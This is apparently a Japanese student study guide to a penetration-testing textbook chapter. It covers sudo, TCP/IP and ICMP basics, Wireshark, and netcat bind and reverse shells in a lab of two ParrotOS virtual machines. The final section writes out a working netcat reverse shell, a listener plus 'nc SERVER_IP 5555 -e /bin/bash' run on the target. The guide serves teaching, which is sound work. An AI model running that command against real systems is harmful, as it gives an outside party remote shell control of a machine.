# EXPERIMENT #01 Potato のハッキング(p262)

事前学習

- su コマンドと sudo コマンドの使い方，sudoers ファイルの設定方法
- ping(ICMP)の仕組み
- IP TCP UDP ICMP といった(L3, L4 の)基本プロトコル
- Wireshark(tcpdump)の表示フィルターとキャプチャーフィルター
- 仮想マシンのクローン
- netcat
- バインドシェルとリバースシェル

## ハッキング技術

重要度 ☆☆☆

- SCAN(スキャン)
  - netdiscover(同一ネットワーク内の PC・ルータ等ネットワークに接続されたデバイスを調査するコマンド)
  - Nmap(ネットワーク調査およびセキュリティ監査を行うためのオープンソースのツール ネットワーク上でどのようなホストか利用可能になっているか，これらのホストが提供しているサービス(アプリケーション名とバージョン)は何か、ホストが実行している OS(OS 名とバージョン)は何か，どのような種類のパケットフィルタ/ファイアウォールが使用されているかなどを調査することができる)
  - Gobuster(ペネトレーションテストや. Web アプリケーションのセキュリティ診断で使用されるオープンソースツールです。Web サイトや Web アプリケーションの隠しディレクトリやファイル検索が可能。ハッキングの際に，隠しページや他にアクセス出来るページを検索する事ができる)
- INVASION(侵入)
  - AnonymousFTP(TCP/IP ネットワーク上でファイルの送受信を行う FTP を、誰でも匿名で自由に利用できるようにする仕組み)
  - Directory traversal(WEB サイトやアプリケーションにおいて，管理者が公開する意思のないファイルや情報に対し，攻撃者が不正にアクセスするサイバー攻撃手法)
  - SSH(Secure Shell の略称で，リモートコンピュータと暗号化して通信するためのプロトコルやアプリケーション)
- AUTHENTICATION(認証)
  - Burp(ペネトレーションテストなどで利用されるローカルプロキシツール PC と Web サーバの通信内容を確認しパラメータを修正，送信などができる)
  - John the ripper(オープンソースのパスワードクラッキングツール，ハッシュ化されたパスワードから、元のパスワードを特定する)
- PRIVILEGE(権限)
  - sudo -l(sudoers ファイルを見る)
  - /bin/nice(processs の実行優先順序を変更するコマンド)

## su コマンドでユーザーを切り替える, sudo コマンド(p262 - p268)

重要度 ☆☆☆

su コマンドと sudo コマンドの違いを説明でき，sudo が推奨される理由を説明できること

## sudo の設定ファイル(p268-p276)

重要度 ☆☆☆

sudo コマンドを使うためには /etc/sudoers に設定を書く必要がある，直接書き換えるのは危険なので visudo 経由で書き換える，`sudo -l` コマンドで確認する。

本来 sudo は，一部の管理者権限をつかえるようにするものだが，最近の Linux においてはシステム管理者に %sudo ALL=(ALL:ALL) ALL を与えて管理者と同等の権限を付与している。

p274 に includedir の説明があるが，このようなファイル分離の仕掛けは UNIX ではよくあるので覚えておくこと。

## Ping を使いこなす(p277 - p280)

重要度 ☆☆☆

ping は tracepath と 同じく L3 の ICMP プロトコルを使用したアプリケーション
TCP/IP での到達可能を判断できる(firewall で遮断されることもある)

Ping スイープをもちいて端末の存在とアドレスを取得することは， 選定フェーズ/偵察・調査フェーズの段階で行われることが多い。様々な方法があるが今後のシナリオで使っていく。

## OSI 参照モデルと TCP/IP 階層モデル(p281)

重要度 ☆☆☆

インターネットネットワークの勉強をすると必ず出てくるので大丈夫だと思うが各階層の

- 名前
- 順番
- 役割
- プロトコル
- ネットワークデバイス

を覚えよう，またなぜこのような階層構造に(カプセル化)しているメリットを説明できるようにしよう

## IP の特徴(p283 - p292)

重要度 ☆☆☆☆☆

### IP パケットのフォーマット(p284)

重要度 ☆☆☆ (現段階では)

コンピュータがバイナリのデータをどのように解釈するかは，プログラムによって定義されている。その際に参照するものに Header 情報があるが，TCP/IP にもそのような構造がある。
パケットスニッファー(tcpdump, wireshark 等)から通信のストリームを取得したときにこれらの Header 情報から様々なことがわかる。
今はすべてを覚える必要はないが，スニッファーのデータをこのフォーマットに照らし合わせることで，どの IP アドレスからどの IP アドレスに対してどのプロトコルを使っているものかくらいは判定できるように。
またルーティングという概念はインターネット通信において非常に重要なので，なにをやっているのかなぜ効率的なのかは理解しておきたい。

## トランスポート層のプロトコル(p292)

重要度 ☆☆☆

TCP と UDP が L4 のプロトコルであり，上位層のアプリケーションがいずれかのプロトコルを経由することによりそれらの通信の信頼性や高速性の性質が決まることを知りそれらの性質を理解する。また UNIX においては(現在は UNIX 以外も)通信プログラムを簡易にするためにソケット通信という仕掛けを用いることを知っておく。

## ポート番号(p292)

重要度 ☆☆☆

ポート番号とはアプリケーションを区別するための番号である。管理者はサーバーデーモンをどのポートを用いるかを決めることができるが，Well-Known と呼ばれる一般的に使われるサービスに対しては IANA と呼ばれる組織から推奨されるポート番号(0-1023)を用いることが多い。ポート番号の範囲は 0-65535 であるが，なぜこの範囲なのかは答えられるようにすること。

## UDP の特徴(p294)

UDP の特徴を知り，UDP に向いているサービスを理解する。もともと UDP は
UserDataProtocol という名称からもわかるように User(プログラマ)が簡易にクライアント・サーバ通信のプログラムに使用するものであるが，UDP 通信を用いる代表的なサービス(ntp, tftp,snmp)も覚えておこう。

## TCP の特徴(p296)

TCP の特徴を知り，TCP に向いているサービスを理解する

### TCP パケットのフォーマット(p297)

パケットスニッファーのデータから TCP パケットの Header フォーマットを参照して情報を取れるようにしよう，以下の情報は重要である

- 送信元ポート番号
- 送信先ポート番号
- シーケンス番号
- ACK 番号(ack, syn, fin)
- コントロールフラグ

TCP がこのような情報を持つことにより後述する信頼性のある通信を行えることを理解する。

### TCP によるコネクションの管理(p300)

TCP 通信は 3way ハンドシェークを経てコネクションを開始し終了時には FIN を用いる

コネクション開始

1. SYN client -> server
2. ACK + SYN server -> client
3. ACK client -> server

コネクション終了

1. FIN client -> server
2. ACK + FIN server -> client
3. ACK client -> server

### TCP の様々な機能(p300)

- 順序制御(シーケンス番号を用いる)
- 再送制御(シーケンス番号と ACK を用いて行う)
- フロー制御(スライディングウィンドウを用いて 1 度に送れるデータ量を制御して通信を効率化する)
- 輻輳制御(輻輳ウインドウを用いてデータ量を制御する)

## ICMP の特徴(p303)

ping や tracepth は ICMP を用いたアプリケーションである，シンプルなので初学者がパケットスニッファーで解析するは ARP プロトコルと並んでうってつけである。ping のパケットをキャプチャしてフォーマットを参照して情報(type, code)を取れるようにしよう

## データにヘッダーが付与されていく流れ(p311)

いわゆるカプセル化であるが，このためにレイヤーが別れていることを理解する。
またこのようなインターフェース通信をすることによってモジュールの独立性が高まり
メンテナンスしやすくなっていることも理解しよう。

## PDU は通信データの単位(p312)

パケットは厳密に言うと L3 の PDU である，各レイヤーの PDU の名称を示す

- L4 セグメント(TCP)
- L4 データグラム(UDP)
- L3 パケット
- L2 フレーム

## Wireshark でパケットをキャプチャーする(p313)

wireshark は GUI のパケットキャプチャーツールである，同等のことは CUI の tcpdump でも行えるが，3wayHandShake の様子やコネクションの情報等が観察できるので使い方を覚えておこう。Hands on では ICMP パケットの解析を行っているが，ICMP フォーマットを参照のうえ表示されている 16 進数から type, code を抜き出してそれぞれが何であるかを説明できるようにしよう。また最低以下はできるようにしよう

- プロミスキャスモードを説明できる
- wireshark を起動してインターフェースを選択できる
- ICMP パケットの観察及び解析できる
- 表示フィルターとキャプチャーフィルターの使い方を理解する

## Netcat でバインドシェルとリバースシェルの基本を習得する(p326)

Netcat はネットワークを扱う万能ツールであり，大抵の Linux には標準で入っている(いくつかのヴァージョンがあるので man 等で確認すること) 。
最低出来てほしいことは[netcat](../docs/netcat.md)にまとめてあるので，そちらを参照せよ

## Netcat の実験環境を考える(p326)

IP アドレスを DHCP をつかって動的に割り当てる場合は，それぞれの IP アドレスを把握すること，なお教科書にある 192.168.56.122 及び 123 は仮想マシンを相当作らないとそれにならない

### ParrotOS の仮想マシンを 2 台準備する(p327)

VirtualBox では簡単にクローンを作ることができるが以下に注意すること

- MAC アドレスポリシーを[すべてのネットワークアダプタで MAC アドレスを生成]
- クローンのタイプを[すべてをクローン]

### Netcat 同士で通信する(p334)

- netcat はサーバーにもクライアントにもなれ，ポート番号も制限範囲で自由に決めることができる
- man をみて各オプションの役割をしらべることと，サンプルを参照すると良い。

教科書では netstat を使用しているが，ss を使うと良い。また lsof との違いも確認せよ

### Netcat によるバインドシェル(p339)

- バインドシェルとは攻撃端末からターゲットに接続して，遠隔でシェルを操作する
- 教科書 p340 の -e オプションは危険なので，Ubuntu など一般的なディストリビューションでは無効にされている，必要ならば対応している netcat をインストールすること

### リバースシェルとは(p341)

バインドシェルがターゲット端末をサーバーにするのに対してリバースシェルは攻撃側端末がサーバーとなる。これはターゲット端末のネットワークに Firewall や NAT 接続があった場合，攻撃側端末の通信がターゲットに届かないことがあるからである。一般的にインバウンドよりアウトバウンドの方が制限がゆるいためリバースシェルが有効になる(だから Strict なファイアウォール設定をしよう)

### Netcat でリバースシェルを実現する(p342)

攻撃側がサーバーになっていることを確認しよう

攻撃側端末

```sh
$ nc -nlvp 5555
```

- n (numeric only)
- l (listen)
- v (verbose)
- p 5555 (port)

ターゲット端末

```sh
$ nc SERVER_IP 5555 -e /bin/bash
```

- e filename specify filename to exec after connect (use with caution)
- c string specify shell commands to exec after connect (use with
  caution). The string is passed to /bin/sh -c for execution.

攻撃側端末

```sh
any shell commands
```
